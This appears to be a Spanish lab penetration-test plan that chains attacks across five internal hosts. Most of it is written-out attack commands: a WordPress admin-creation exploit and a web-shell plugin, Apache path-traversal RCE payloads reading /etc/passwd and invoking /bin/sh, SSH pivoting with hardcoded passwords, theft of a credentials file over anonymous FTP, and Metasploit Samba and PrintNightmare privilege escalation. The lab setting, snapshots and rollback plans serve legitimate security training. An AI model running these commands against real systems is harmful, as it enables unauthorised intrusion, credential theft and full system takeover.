# Plan 005 · Validación, explotación y cadena

> El flujo detallado por vulnerabilidad está en [`vulns/`](./vulns/). Este plan es la vista de fase; las specs por vuln son la vista de ejecución.

## 1. Enfoque

Se explota M1 primero, se pivota, y se cierra M2 → M3 → M4 → M5. Cada PoC tiene snapshot, comando, salida real y evidencia. W1 es la demo principal; W4/W3 son respaldo; W2 tiene time-box.

## 2. Orden y time-box

| # | Objetivo | Vector | Time-box | Fallback |
|---|---|---|---|---|
| 1 | M1 | W1 wp2shell | 2 h | W4 |
| 2 | M1 | W4 admin → plugin | 30 min | — |
| 3 | M1 | W3 Apache | 2 h | W1 |
| 4 | M1 | W2 PHP2Shell | 3–4 h | W1/W3 |
| 5 | M1 | SSH root | 15 min | — |
| 6 | Pivote | SSH `-L` / ligolo | 30 min | proxychains |
| 7 | M2 | D2/D3/D4 | 1 h | — |
| 8 | M2 | D1 Redis | 2 h | D2 |
| 9 | M3 | B3/B4 | 1 h | — |
| 10 | M3 | B1 Samba 4.5.9 | 2–3 h | B5 |
| 11 | M4 | S3/S4/S5 | 1 h | — |
| 12 | M4 | S2 LPE | 2–3 h | Otro LPE |
| 13 | M5 | C2/C4/C3 | 1 h | — |
| 14 | Impacto | Marcadores | 30 min | — |

## 3. M1 · W1 wp2shell (principal)

```bash
cd ~/tools
git clone https://github.com/DeadExpl0it/wp2shell-poc
python3 wp2shell-poc/wp2shell.py      # modo 1: fingerprint
# o Vulhub:
python3 poc.py http://10.10.10.11 --check
python3 poc.py http://10.10.10.11 --username w2s_lab --password 'Lab2026!' --email w2s@lab.local
```

Luego:

1. Login en `http://wp.uni.lab/wp-admin/` con el admin creado.
2. Subir un plugin mínimo (`lab-shell.zip`) y activarlo.
3. `curl -s 'http://wp.uni.lab/wp-content/plugins/lab-shell/lab-shell.php?c=id'`.
4. Capturar `uid=33(www-data)`.

**Snapshot:** `previo-a-W1`.
**Evidencia:** request batch, admin creado, plugin, `id`.

## 4. M1 · W4 (respaldo)

```bash
curl -s -c /tmp/wp.cookies http://wp.uni.lab/wp-login.php -o /dev/null
curl -s -b /tmp/wp.cookies -c /tmp/wp.cookies -D - -o /dev/null \
  -d 'log=usc.admin&pwd=Admin13.-&wp-submit=Log+In&testcookie=1' \
  http://wp.uni.lab/wp-login.php | grep -Ei 'HTTP/|Location:|wordpress_logged_in'
```

Subir plugin y ejecutar `id`.

## 5. M1 · W3 Apache

```bash
curl -s --path-as-is 'http://10.10.10.11/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' | head -3
curl -s --path-as-is -X POST 'http://10.10.10.11/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' \
  -d 'echo Content-Type: text/plain; echo; id'
```

Si sigue 503, revisar `mod_cgi`, `ScriptAlias`, `Options +ExecCGI` y `Require all granted`.

## 6. M1 · W2 PHP2Shell

```bash
/usr/local/apache2/bin/httpd -V | grep MPM
/usr/local/bin/php -i | grep -E 'Thread Safety|Server API|memory_limit|display_errors|session.upload_progress.enabled'
python3 poc_109618.py -u http://10.10.10.11/index.php -c 'id>p1.txt' --fetch /p1.txt
```

Condiciones: prefork, NTS, `display_errors=On`, `memory_limit=8M`, `upload_progress=On`, offsets de `libphp.so`. Si falla tras el time-box, documentar y seguir con W1/W3.

## 7. M1 · SSH root y pivote

```bash
sshpass -p 'Admin13.-' ssh ubuntu@10.10.10.11 'id; hostname'
sshpass -p 'Admin13.-' ssh ubuntu@10.10.10.11 'echo Admin13.- | sudo -S id'
sshpass -p 'Admin13.-' ssh -N -L 13306:10.10.10.12:3306 ubuntu@10.10.10.11 &
```

Verificar pivote:

```bash
mysql --skip-ssl -h 127.0.0.1 -P 13306 -u wp_user -p'wp_pass123' -e 'SHOW DATABASES;'
```

## 8. M2

```bash
redis-cli -h 10.10.10.12 PING
redis-cli -h 10.10.10.12 INFO server | grep redis_version
redis-cli -h 10.10.10.12 DBSIZE
mysql --skip-ssl -h 127.0.0.1 -P 13306 -u wp_user -p'wp_pass123' -e 'SHOW DATABASES;'
onesixtyone 10.10.10.12 public
snmpwalk -v2c -c public 10.10.10.12 system
```

D1 Lua solo si Redis es paquete distro. Si no, documentar.

## 9. M3

```bash
curl -s ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt
showmount -e 10.10.10.13
sudo mount -t nfs 10.10.10.13:/srv/storage/backups /mnt/x
sudo touch /mnt/x/ROOT_FUE_AQUI.txt && ls -l /mnt/x/
smbclient -L //10.10.10.13 -N
nc -zv 10.10.10.13 6200
sshpass -p 'rony123' ssh rony123@10.10.10.13 'id'
```

B1: MSF `exploit/linux/samba/is_known_pipename` contra Samba 4.5.9. B2: solo con binario troyanizado.

## 10. M4

```bash
nxc smb 10.10.10.14 -u Administrador -p 'password_2026' --shares
nxc smb 10.10.10.14 -u soporte -p 'Soporte123!' --shares
dig axfr uni.lab @10.10.10.14
nmap -sT --script smb-security-mode -p 445 10.10.10.14
nxc winrm 10.10.10.14 -u soporte -p 'Soporte123!' -x whoami
```

Privesc real:

1. `soporte` debe ser usuario limitado (no Administradores).
2. Obtener sesión con `exploit/windows/winrm/winrm_script_exec`.
3. Ejecutar `exploit/windows/local/cve_2021_1675_printnightmare` con esa sesión.
4. Si falla, usar `Invoke-Nightmare`.
5. Capturar `whoami` → `nt authority\system`.

**Clave:** ejecutar desde M1/pivote, no desde M6; el firewall de M4 solo permite M1. `nxc -x whoami` con admin no cuenta como privesc.

## 11. M5

```bash
nxc smb 10.10.10.15 -u cliente -p 'Admin13.-' --shares
vncviewer 10.10.10.15
xfreerdp /v:10.10.10.15 /u:cliente /p:'Admin13.-' /cert:ignore
```

C1: verificar `winver`; si es 19045, no aplica.

## 12. Impacto

```bash
# M1
echo "PWNED-M1 $(date -u)" | sudo tee /var/www/wp/wp-content/uploads/PWNED-M1.txt
curl -s http://wp.uni.lab/wp-content/uploads/PWNED-M1.txt
# M5 por VNC
echo PWNED-M5 %DATE% %TIME% > C:\Users\cliente\Desktop\PWNED-M5.txt
```

No borrar logs, no tocar backups, no cifrar.

## 13. Evidencia

| ID | Qué demuestra |
|---|---|
| `EV-005-M1-01` | W1 admin/plugin/`id` |
| `EV-005-M1-02` | W4 login/plugin/`id` |
| `EV-005-M1-03` | W3 traversal/RCE |
| `EV-005-M1-04` | W2 `id` o limitación |
| `EV-005-M1-05` | SSH root |
| `EV-005-PIVOTE` | Túnel y `nmap` |
| `EV-005-M2-*` | Redis/DB/SNMP |
| `EV-005-M3-*` | FTP/NFS/Samba |
| `EV-005-M4-*` | S3/S4/S5/S2 |
| `EV-005-M5-*` | C2/C3/C4 |

## 14. Snapshots

`previo-a-W1`, `previo-a-W2`, `previo-a-W3`, `previo-a-W4`, `previo-a-SSH`, `previo-a-D1`, `previo-a-B1`, `previo-a-S1`, `previo-a-S2`, `previo-a-C4`.

## 15. Riesgos y rollback

| Riesgo | Acción |
|---|---|
| W2 crashea Apache | Restaurar `previo-a-W2`; documentar |
| PrintNightmare crashea M4 | Restaurar `previo-a-S2`; usar otro LPE |
| Samba 4.5.9 no compila | B5 SSH |
| El túnel falla | Usar ligolo o proxychains |
| El PoC deja usuarios/plugins | Restaurar `estado-inicial-vulnerable` antes de Fase 5 |

## 16. Definición de terminado

- [ ] 5/5 con presencia.
- [ ] W1 o W4 con `id`.
- [ ] M4 con privesc desde `soporte`.
- [ ] Tabla de alcance completa.
- [ ] Evidencias y hashes.
- [ ] `MEMORY.md` actualizado.

## 17. Estimación

| Bloque | Horas |
|---|---|
| M1 + pivote | 6–8 |
| M2 + M3 | 4–5 |
| M4 + M5 | 4–5 |
| Impacto/evidencia | 1–2 |
| **Total** | **15–20** |
